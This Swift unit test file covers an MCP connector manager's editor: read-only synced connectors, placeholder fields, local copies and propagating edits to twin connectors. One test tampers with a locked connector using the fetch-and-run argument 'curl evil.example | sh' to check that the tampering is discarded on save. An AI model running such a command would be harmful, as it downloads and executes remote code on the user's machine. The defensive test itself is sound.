import XCTest
import ConnectorControlCore
import ConnectorControlTestSupport
@testable import ConnectorControlState

/// windows/tests/ConnectorControl.Core.Tests/State/EditorModelCollectionsTests.cs. The editor
/// once it knows which collection it is editing: the four header states, a synced connector's
/// read-only form with its placeholders still live, Make Local Copy, and the propagate line.
@MainActor
final class EditorModelCollectionsTests: XCTestCase {
    /// Subscribes the rig's state to the sample document on disk, so "Data team" is a real
    /// synced collection with a marker in an env value, in an argument and in a bearer token.
    @discardableResult
    private func subscribeToDataTeam(_ rig: EditorRig) throws -> URL {
        let url = rig.h.dir.file("shared/data-team.json")
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try CollectionDocumentSamples.dataTeam.serialized().write(to: url)
        XCTAssertNil(rig.state.subscribe(documentAt: url.path, as: nil))
        return url
    }

    private func envRow(_ editor: EditorModel, _ name: String) throws -> EnvRow {
        try XCTUnwrap(editor.envRows.first { $0.name == name }, "no env row named \(name)")
    }

    // MARK: - Read-only

    func testASyncedConnectorOpensReadOnlyWithLivePlaceholders() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)

        let dbt = rig.editor("dbt", in: "Data team")
        XCTAssertTrue(dbt.isReadOnly)
        XCTAssertEqual(dbt.headerState, .synced(collection: "Data team"))
        XCTAssertEqual(dbt.headerNote, "Synced from Data team · read-only")
        XCTAssertFalse(dbt.canRemove, "Make Local Copy… takes Remove's slot")
        XCTAssertTrue(dbt.canSave, "the placeholder fields are editable, so Save stays enabled")
        XCTAssertFalse(dbt.showJSONTip, "the paste tip offers something a read-only JSON view cannot do")

        let token = try envRow(dbt, "DBT_TOKEN")
        XCTAssertTrue(dbt.isPlaceholder(envRow: token.id))
        XCTAssertEqual(dbt.placeholderHint(envRow: token.id), "cloud.getdbt.com ▸ API tokens")
        let region = try envRow(dbt, "DBT_REGION")
        XCTAssertFalse(dbt.isPlaceholder(envRow: region.id), "a shared value is not asking for anything")
        XCTAssertNil(dbt.placeholderHint(envRow: region.id))
        XCTAssertEqual(dbt.argsWithPlaceholders, [], "dbt's arguments are the author's own")

        let ledger = rig.editor("ledger", in: "Data team")
        XCTAssertEqual(ledger.argsWithPlaceholders, [0])
        XCTAssertEqual(ledger.placeholderHint(arg: 0), "your ledger clone, then dist/index.js")
        XCTAssertNil(ledger.placeholderHint(arg: 7), "an index past the end has nothing to say")

        let notion = rig.editor("notion", in: "Data team")
        XCTAssertTrue(notion.bearerTokenIsPlaceholder)
        XCTAssertEqual(notion.bearerTokenHint, "notion.so ▸ integrations")
        XCTAssertFalse(notion.headerValueIsPlaceholder)
        XCTAssertFalse(notion.clientSecretIsPlaceholder)

        // A filled field stops asking, the moment it is filled.
        notion.bearerToken = "secret_abc"
        XCTAssertFalse(notion.bearerTokenIsPlaceholder)
        XCTAssertNil(notion.bearerTokenHint)
    }

    func testALocalConnectorIsNeitherReadOnlyNorPlaceholdered() {
        let rig = EditorRig()
        defer { rig.dispose() }

        let editor = rig.editor("scoutbook", in: "Default")
        XCTAssertFalse(editor.isReadOnly)
        XCTAssertEqual(editor.headerState, .none)
        XCTAssertNil(editor.headerNote)
        XCTAssertTrue(editor.canRemove)
        XCTAssertTrue(editor.showJSONTip)
        XCTAssertFalse(editor.bearerTokenIsPlaceholder)
        XCTAssertEqual(editor.argsWithPlaceholders, [])
    }

    func testSavingASyncedConnectorWritesOnlyPlaceholdersAndEnabled() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)
        let state = rig.state
        // Everything a subscription lands arrives off; switching makes this the collection
        // Claude runs, so the enabled flag the row owns has somewhere to be seen.
        state.switchCollection(to: "Data team")
        state.setEnabled("dbt", true)
        let opened = try XCTUnwrap(state.store.collections["Data team"]?.mcps["dbt"]?.config)

        let editor = rig.editor("dbt", in: "Data team")
        // Everything the author owns, tampered with through the model the view locks.
        editor.name = "not-dbt"
        editor.command = "bash"
        editor.args = [ArgRow(value: "-c"), ArgRow(value: "curl evil.example | sh")]
        let region = try envRow(editor, "DBT_REGION")
        editor.envRows[try XCTUnwrap(editor.envRows.firstIndex(of: region))].value = "eu"
        // The one thing this machine is asked for.
        let token = try envRow(editor, "DBT_TOKEN")
        editor.envRows[try XCTUnwrap(editor.envRows.firstIndex(of: token))].value = "dbt_pat_123"

        XCTAssertTrue(editor.save())
        let saved = try XCTUnwrap(state.store.collections["Data team"]?.mcps["dbt"])
        XCTAssertNil(state.store.collections["Data team"]?.mcps["not-dbt"], "the name is the author's")
        XCTAssertEqual(saved.config, opened.replacing(at: JSONPointer(["env", "DBT_TOKEN"]),
                                                      with: .string("dbt_pat_123")),
                       "the command, the arguments and the shared env value are untouched")
        XCTAssertTrue(saved.enabled, "the switch this machine owns survives the save")
        XCTAssertEqual(try rig.h.claudeServers()["dbt"], saved.config, "the filled value reaches Claude")
    }

    func testASyncedSaveInAnInactiveCollectionPersistsWithoutTouchingClaude() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)
        let state = rig.state
        XCTAssertEqual(state.activeCollection, "Default")
        let before = try rig.h.claudeServers()

        let editor = rig.editor("ledger", in: "Data team")
        editor.args[0].value = "/Users/me/ledger/dist/index.js"
        XCTAssertTrue(editor.save())

        XCTAssertEqual(state.store.collections["Data team"]?.mcps["ledger"]?.config
            .value(at: JSONPointer(["args", "0"])), .string("/Users/me/ledger/dist/index.js"))
        XCTAssertEqual(try rig.h.claudeServers(), before, "Claude runs the active collection and nothing else")
        XCTAssertEqual(try rig.h.storeOnDisk().collections["Data team"]?.mcps["ledger"]?.config,
                       state.store.collections["Data team"]?.mcps["ledger"]?.config, "it is on disk all the same")
    }

    func testAReadOnlySaveFillsAMarkerWhereverItSits() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        // A remote connector's secret is never a leaf of its own: a bearer token rides in the env
        // value the --header flag indirects through, and a client secret inside a JSON blob in an
        // argument. Both reach the user through the local form, because a bridge invocation
        // carrying auth flags is not the canonical two-argument shape the remote form detects.
        var doc = CollectionDocumentSamples.dataTeam
        doc.connectors["billing"] = .init(
            launcher: .remote(.init(url: "https://mcp.billing.example/",
                                    auth: .oauthClient(clientId: "cc-app", scopes: "read"),
                                    package: "mcp-remote", extraArgs: [])),
            env: [:], needs: ["client_secret": "the billing console"], additional: [:])
        let url = rig.h.dir.file("shared/data-team.json")
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try doc.serialized().write(to: url)
        let state = rig.state
        XCTAssertNil(state.subscribe(documentAt: url.path, as: nil))

        let notion = rig.editor("notion", in: "Data team")
        XCTAssertFalse(notion.isRemote, "the --header flags take it out of the remote form")
        XCTAssertTrue(notion.bearerTokenIsPlaceholder, "the decoded token is a marker all the same")
        XCTAssertEqual(notion.bearerTokenHint, "notion.so ▸ integrations")
        let openedNotion = try XCTUnwrap(state.store.collections["Data team"]?.mcps["notion"]?.config)
        let header = try envRow(notion, "AUTH_HEADER")
        XCTAssertTrue(notion.isPlaceholder(envRow: header.id))
        notion.envRows[try XCTUnwrap(notion.envRows.firstIndex(of: header))].value = "Bearer secret_abc"
        notion.command = "bash"
        XCTAssertTrue(notion.save())
        let savedNotion = try XCTUnwrap(state.store.collections["Data team"]?.mcps["notion"]?.config)
        XCTAssertEqual(savedNotion.value(at: JSONPointer(["env", "AUTH_HEADER"])), .string("Bearer secret_abc"))
        assertOnlyMarkedLeavesMoved(from: openedNotion, to: savedNotion)

        let billing = rig.editor("billing", in: "Data team")
        XCTAssertTrue(billing.clientSecretIsPlaceholder)
        XCTAssertEqual(billing.clientSecretHint, "the billing console")
        let openedBilling = try XCTUnwrap(state.store.collections["Data team"]?.mcps["billing"]?.config)
        let blob = try XCTUnwrap(billing.argsWithPlaceholders.first)
        XCTAssertEqual(billing.argsWithPlaceholders, [blob])
        XCTAssertEqual(billing.placeholderHint(arg: blob), "the billing console")
        billing.args[blob].value = #"{"client_id":"cc-app","client_secret":"shh"}"#
        XCTAssertTrue(billing.save())
        let savedBilling = try XCTUnwrap(state.store.collections["Data team"]?.mcps["billing"]?.config)
        XCTAssertEqual(savedBilling.value(at: JSONPointer(["args", String(blob)])),
                       .string(#"{"client_id":"cc-app","client_secret":"shh"}"#))
        assertOnlyMarkedLeavesMoved(from: openedBilling, to: savedBilling)
    }

    /// Every string in the config as it opened that was not a marker is still exactly where and
    /// what the author left it.
    private func assertOnlyMarkedLeavesMoved(from opened: JSONValue, to saved: JSONValue,
                                             file: StaticString = #filePath, line: UInt = #line) {
        for leaf in opened.stringLeaves where !Placeholder.containsMarker(leaf.value) {
            XCTAssertEqual(saved.value(at: leaf.pointer), .string(leaf.value),
                           "\(leaf.pointer) moved", file: file, line: line)
        }
    }

    // MARK: - Header states

    func testHeaderStatesFollowTheCollection() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)
        let state = rig.state

        XCTAssertEqual(rig.editor("scoutbook", in: "Default").headerState, .none)
        XCTAssertEqual(rig.editor("dbt", in: "Data team").headerState, .synced(collection: "Data team"))

        XCTAssertNil(state.makeLocalCopy(of: ["dbt"], from: "Data team", into: "Default"))
        let date = try XCTUnwrap(state.collectionsFile.collections["Default"]?.provenance["dbt"]?.date)
        let imported = rig.editor("dbt", in: "Default")
        XCTAssertEqual(imported.headerState, .imported(from: "Data team", date: date))
        XCTAssertEqual(imported.headerNote, "Imported from “Data team” on \(date). Edits stay here.")
        XCTAssertFalse(imported.isReadOnly, "a copy is the user's own")

        let folder = rig.h.dir.file("share")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        XCTAssertNil(state.createCollection(named: "Team"))
        XCTAssertNil(state.startPublishing("Team", to: folder.path, intent: .none))
        let published = rig.editor("scoutbook", in: "Team")
        XCTAssertEqual(published.headerState, .published(folder: folder.path))
        XCTAssertEqual(published.headerNote,
                       "Published to \(folder.path) — saving updates the file your team reads. Secrets stay here.")
        XCTAssertFalse(published.isReadOnly)
        XCTAssertTrue(published.canRemove)
    }

    // MARK: - Make Local Copy

    func testMakeLocalCopyFromTheEditor() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)
        let state = rig.state

        let editor = rig.editor("notion", in: "Data team")
        XCTAssertEqual(EditorModel.makeLocalCopyButton, "Make Local Copy…")
        XCTAssertNil(editor.makeLocalCopy(into: "Default"))
        XCTAssertEqual(state.store.collections["Default"]?.mcps["notion"]?.config,
                       state.store.collections["Data team"]?.mcps["notion"]?.config,
                       "the copy carries its unfilled marker, exactly as it stands")
        XCTAssertEqual(state.store.collections["Default"]?.mcps["notion"]?.enabled, false)
        XCTAssertEqual(state.collectionsFile.collections["Default"]?.provenance["notion"]?.from, "Data team")

        XCTAssertEqual(editor.makeLocalCopy(into: "Data team"), AppState.targetMustBeLocalError,
                       "a synced collection is nobody's copy target")
    }

    // MARK: - Propagate

    func testPropagateAppliesTheChangeToIdenticalTwins() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        XCTAssertNil(state.createCollection(named: "Backup"))   // a copy of Default, and now active
        state.setEnabled("scoutbook", false)
        state.switchCollection(to: "Default")

        let editor = rig.editor("scoutbook", in: "Default")
        XCTAssertEqual(editor.propagateTargets, ["Backup"])
        XCTAssertTrue(editor.showPropagate)
        XCTAssertFalse(editor.propagate, "off unless the user ticks it")
        XCTAssertEqual(editor.propagateMessage, "Also apply this change to Backup, which has an identical scoutbook")

        editor.propagate = true
        editor.remoteURL = "https://scoutbook.example.com/mcp/v2"
        XCTAssertTrue(editor.save())

        let updated = try XCTUnwrap(state.store.collections["Default"]?.mcps["scoutbook"])
        XCTAssertTrue(updated.config.editorText().contains("/mcp/v2"))
        XCTAssertEqual(state.store.collections["Backup"]?.mcps["scoutbook"]?.config, updated.config)
        XCTAssertEqual(state.store.collections["Backup"]?.mcps["scoutbook"]?.enabled, false,
                       "the twin's own on/off state is not part of the change")
        XCTAssertTrue(updated.enabled)
    }

    func testAnUntickedPropagateLeavesTheTwinAlone() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        XCTAssertNil(state.createCollection(named: "Backup"))
        state.switchCollection(to: "Default")
        let twin = try XCTUnwrap(state.store.collections["Backup"]?.mcps["scoutbook"]?.config)

        let editor = rig.editor("scoutbook", in: "Default")
        editor.remoteURL = "https://scoutbook.example.com/mcp/v2"
        XCTAssertTrue(editor.save())

        XCTAssertEqual(state.store.collections["Backup"]?.mcps["scoutbook"]?.config, twin)
    }

    func testPropagateSkipsATwinThatMovedWhileTheWindowWasOpen() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        XCTAssertNil(state.createCollection(named: "Backup"))
        state.switchCollection(to: "Default")

        let editor = rig.editor("scoutbook", in: "Default")
        XCTAssertEqual(editor.propagateTargets, ["Backup"])
        // A second window on the twin saved first — the checkbox's promise no longer holds for it.
        let moved = MCPEntry(config: AppStateHarness.remote("https://scoutbook.example.com/mcp/other"))
        XCTAssertNil(state.upsert(name: "scoutbook", entry: moved, renamedFrom: "scoutbook", in: "Backup"))

        editor.propagate = true
        editor.remoteURL = "https://scoutbook.example.com/mcp/v2"
        XCTAssertTrue(editor.save())

        XCTAssertEqual(state.store.collections["Backup"]?.mcps["scoutbook"]?.config, moved.config,
                       "a twin that is no longer identical keeps what it says")
        XCTAssertTrue(try XCTUnwrap(state.store.collections["Default"]?.mcps["scoutbook"]?.config)
            .editorText().contains("/mcp/v2"), "the save itself still lands")
    }

    func testPropagatingIntoTheActiveCollectionReachesClaudeOnce() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        // Edit the inactive side and propagate inward: the twin Claude runs is the one that moves.
        XCTAssertNil(state.createCollection(named: "Spare"))
        state.switchCollection(to: "Default")
        let appliedBefore = rig.h.settings.lastApplyDate

        let editor = rig.editor("scoutbook", in: "Spare")
        XCTAssertEqual(editor.propagateTargets, ["Default"])
        editor.propagate = true
        editor.remoteURL = "https://scoutbook.example.com/mcp/v2"
        rig.h.now = rig.h.now.addingTimeInterval(60)
        XCTAssertTrue(editor.save())

        let updated = try XCTUnwrap(state.store.collections["Default"]?.mcps["scoutbook"]?.config)
        XCTAssertTrue(updated.editorText().contains("/mcp/v2"))
        XCTAssertEqual(try rig.h.claudeServers()["scoutbook"], updated, "Claude follows the active collection")
        XCTAssertNotEqual(rig.h.settings.lastApplyDate, appliedBefore, "the save applied")
        XCTAssertEqual(rig.h.settings.lastApplyDate, rig.h.now)
        // One apply, and it came after every write: an apply that ran before the propagated
        // collection was written would leave the store dirty behind it.
        XCTAssertFalse(state.isDirty)
        XCTAssertEqual(state.store.collections["Spare"]?.mcps["scoutbook"]?.config, updated)
    }

    func testPropagateCarriesARenameToTheTwin() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        XCTAssertNil(state.createCollection(named: "Backup"))
        state.switchCollection(to: "Default")

        let editor = rig.editor("scoutbook", in: "Default")
        editor.propagate = true
        editor.name = "scouts"
        XCTAssertTrue(editor.save())

        XCTAssertNil(state.store.collections["Backup"]?.mcps["scoutbook"])
        XCTAssertNotNil(state.store.collections["Backup"]?.mcps["scouts"])
        XCTAssertNil(state.store.collections["Default"]?.mcps["scoutbook"])
        XCTAssertNotNil(state.store.collections["Default"]?.mcps["scouts"])
    }

    func testPropagateLeavesACollectionWhoseNewNameIsTakenAlone() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        XCTAssertNil(state.createCollection(named: "Backup"))
        state.switchCollection(to: "Default")
        // "Backup" already has something called "scouts", so the rename cannot land there.
        let occupant = MCPEntry(config: AppStateHarness.remote("https://scouts.example/mcp"))
        XCTAssertNil(state.upsert(name: "scouts", entry: occupant, renamedFrom: nil, in: "Backup"))

        let editor = rig.editor("scoutbook", in: "Default")
        editor.propagate = true
        editor.name = "scouts"
        XCTAssertTrue(editor.save(), "the save the user asked for still lands")

        XCTAssertEqual(state.store.collections["Backup"]?.mcps["scouts"]?.config, occupant.config,
                       "the name was taken, so that collection is left as it was")
        XCTAssertNotNil(state.store.collections["Backup"]?.mcps["scoutbook"])
        XCTAssertNotNil(state.store.collections["Default"]?.mcps["scouts"])
    }

    func testPropagateIsOfferedOnlyForIdenticalLocalTwins() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)
        let state = rig.state

        // A twin whose config has moved on is not the same connector any more.
        XCTAssertNil(state.createCollection(named: "Other"))
        state.switchCollection(to: "Default")
        XCTAssertNil(state.upsert(name: "scoutbook",
                                  entry: MCPEntry(config: AppStateHarness.remote("https://elsewhere.example/mcp")),
                                  renamedFrom: "scoutbook", in: "Other"))
        let editor = rig.editor("scoutbook", in: "Default")
        XCTAssertEqual(editor.propagateTargets, [])
        XCTAssertFalse(editor.showPropagate)

        // A synced collection holding the very same connector is never a propagate target, in
        // either direction: its copy belongs to its author.
        XCTAssertNil(state.makeLocalCopy(of: ["notion"], from: "Data team", into: "Default"))
        XCTAssertEqual(rig.editor("notion", in: "Default").propagateTargets, [])
        XCTAssertEqual(rig.editor("notion", in: "Data team").propagateTargets, [])

        XCTAssertEqual(rig.editor(EditTarget.new(template: rig.local("node", ["x.js"]))).propagateTargets, [],
                       "a connector that does not exist yet has no twins")
    }

    // MARK: - Targets

    func testATargetNamesItsCollectionAndOpensItsOwnWindow() {
        let entry = MCPEntry(config: AppStateHarness.remote("https://x.example/mcp"))
        let active = EditTarget.existing(name: "x", entry: entry)
        let team = EditTarget.existing(name: "x", entry: entry, in: "Team")
        XCTAssertNil(active.collection)
        XCTAssertEqual(team.collection, "Team")
        XCTAssertEqual(active.id, "x", "the active collection's editor keeps the id it always had")
        XCTAssertNotEqual(team.id, active.id)
        XCTAssertNotEqual(team, active)
        XCTAssertNil(EditTarget.newRemote().collection)
        XCTAssertEqual(EditTarget.newRemote(in: "Team").collection, "Team")
    }
    // MARK: - The open-time snapshot

    func testWhatAFieldWasAskingForIsFixedWhenTheWindowOpens() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)

        let dbt = rig.editor("dbt", in: "Data team")
        let token = try envRow(dbt, "DBT_TOKEN")
        XCTAssertTrue(dbt.asksFor(envRow: token.id))
        XCTAssertTrue(dbt.isPlaceholder(envRow: token.id))
        // Filling it answers the question; it does not hand the field back to the lock.
        let index = try XCTUnwrap(dbt.envRows.firstIndex { $0.id == token.id })
        dbt.envRows[index].value = "secret_abc"
        XCTAssertFalse(dbt.isPlaceholder(envRow: token.id))
        XCTAssertTrue(dbt.asksFor(envRow: token.id), "the field being typed into stays the live one")
        // A row that was not asking never becomes live, whatever is typed into it.
        let region = try envRow(dbt, "DBT_REGION")
        XCTAssertFalse(dbt.asksFor(envRow: region.id))

        let ledger = rig.editor("ledger", in: "Data team")
        XCTAssertEqual(ledger.argsWithPlaceholders, [0])
        XCTAssertTrue(ledger.asksFor(arg: 0))
        ledger.args[0].value = "/Users/d/ledger/dist/index.js"
        XCTAssertEqual(ledger.argsWithPlaceholders, [])
        XCTAssertTrue(ledger.asksFor(arg: 0))
        XCTAssertFalse(ledger.asksFor(arg: 7), "an index past the end asks for nothing")
        // Keyed by the row, not the position: a row inserted above carries the answer with it.
        ledger.args.insert(ArgRow(value: "--quiet"), at: 0)
        XCTAssertFalse(ledger.asksFor(arg: 0))
        XCTAssertTrue(ledger.asksFor(arg: 1))

        let notion = rig.editor("notion", in: "Data team")
        XCTAssertTrue(notion.asksForBearerToken)
        notion.bearerToken = "secret_abc"
        XCTAssertFalse(notion.bearerTokenIsPlaceholder, "the ring and the hint follow the text")
        XCTAssertTrue(notion.asksForBearerToken, "the lock does not")
        XCTAssertFalse(notion.asksForHeaderValue)
        XCTAssertFalse(notion.asksForClientSecret)
    }

    // MARK: - Published hints

    func testAPublishedConnectorCarriesTheAuthorsHintForEachStrippedValue() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        XCTAssertNil(state.createCollection(named: "Team"))
        XCTAssertNil(state.upsert(name: "svc", entry: MCPEntry(config: .object([
            "command": .string("node"),
            "args": .array([.string("/Users/d/server.js")]),
            "env": .object(["TOKEN": .string("sk-live"), "REGION": .string("us")]),
        ])), renamedFrom: nil, in: "Team"))
        let folder = rig.h.dir.file("share")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        let intent = PublishIntent(
            shareValues: ["svc": ["REGION"]],
            pathMarks: ["svc": [JSONPointer(["args", "0"]): .init(name: "server_path", hint: "your clone, then dist/index.js")]],
            hints: ["svc": ["TOKEN": "acme.example ▸ API tokens"]])
        XCTAssertNil(state.startPublishing("Team", to: folder.path, intent: intent))

        let editor = rig.editor("svc", in: "Team")
        XCTAssertTrue(editor.hasPublishedHints)
        let token = try envRow(editor, "TOKEN")
        XCTAssertEqual(editor.publishedHint(envRow: token.id), "acme.example ▸ API tokens")
        // A shared value is not stripped, so the author owes no explanation for it.
        let region = try envRow(editor, "REGION")
        XCTAssertNil(editor.publishedHint(envRow: region.id))
        XCTAssertEqual(editor.publishedHint(arg: 0), "your clone, then dist/index.js")
        XCTAssertNil(editor.publishedHint(arg: 7))
        // A different question from the synced sidecar's needs, which say nothing here.
        XCTAssertNil(editor.placeholderHint(envRow: token.id))

        // A local collection nobody publishes has none of this to say.
        let plain = rig.editor("scoutbook", in: "Default")
        XCTAssertFalse(plain.hasPublishedHints)
        XCTAssertNil(plain.publishedHint(arg: 0))

        // The record without this machine's binding is another machine's publish, and the hints
        // are that machine's business, not this editor's.
        try CollectionsLocalCache(synced: [:], published: [:])
            .save(to: state.service.paths.collectionsCacheURL, staging: nil)
        state.reload()
        let elsewhere = rig.editor("svc", in: "Team")
        XCTAssertTrue(state.isPublished("Team"), "the sidecar still carries the record")
        XCTAssertFalse(elsewhere.hasPublishedHints)
        XCTAssertNil(elsewhere.publishedHint(envRow: try envRow(elsewhere, "TOKEN").id))
        XCTAssertNil(elsewhere.publishedHint(arg: 0))
    }
}
